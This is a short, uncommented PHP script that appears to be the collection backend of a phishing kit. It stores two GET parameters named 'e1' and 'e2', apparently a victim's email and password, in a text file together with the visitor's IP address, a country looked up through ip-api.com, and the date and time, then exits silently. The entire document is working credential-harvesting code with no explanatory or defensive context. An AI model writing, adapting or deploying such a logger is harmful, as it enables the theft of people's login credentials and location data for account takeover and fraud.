<?php
$ip = $_SERVER['REMOTE_ADDR'];
$xml = simplexml_load_file("http://ip-api.com/xml/".$ip);
$co = $xml->country;
$xo = $co."";
$i1 = $_GET['e1']."";
$i2 = $_GET['e2']."";
$date =  date('d-m-y');
$time =  date('h:i:s');
$file=fopen("loggings.txt", "a");
fwrite($file, "$i1\n$i2\n$xo\n$ip\n$date\n$time");
fwrite($file, "\n");
fwrite($file, "\n");
fclose($file);

exit();